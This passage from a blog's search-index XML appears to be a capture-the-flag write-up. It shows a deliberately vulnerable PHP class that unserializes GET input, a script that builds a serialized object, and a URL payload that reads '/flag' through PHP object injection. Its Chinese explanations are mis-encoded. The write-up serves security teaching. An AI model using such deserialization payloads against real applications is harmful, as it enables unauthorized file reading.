class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();       </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ord() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„é¦–ä¸ªå­—ç¬¦çš„ ASCII å€¼ã€‚</p><p>file_get_contents() æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚</p></blockquote><p>è¦åˆ©ç”¨read()çš„file_get_contents()è¯»å–flag.phpï¼Œå³<code>/flag</code></p><p>æ‰€ä»¥process()çš„$op==â€2â€ï¼Œç„¶åé€šè¿‡output()è¾“å‡º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $op = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> $filename = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileHandler;</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æŠŠè¾“å‡ºçš„$bé€‚å½“ä¿®æ”¹ï¼Œå¾—åˆ°payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;s:5:&quot;&#x2F;flag&quot;;S:10:&quot;\00*\00content&quot;;s:12:&quot;Hello%20World!&quot;;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ä¿¡æ¯å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
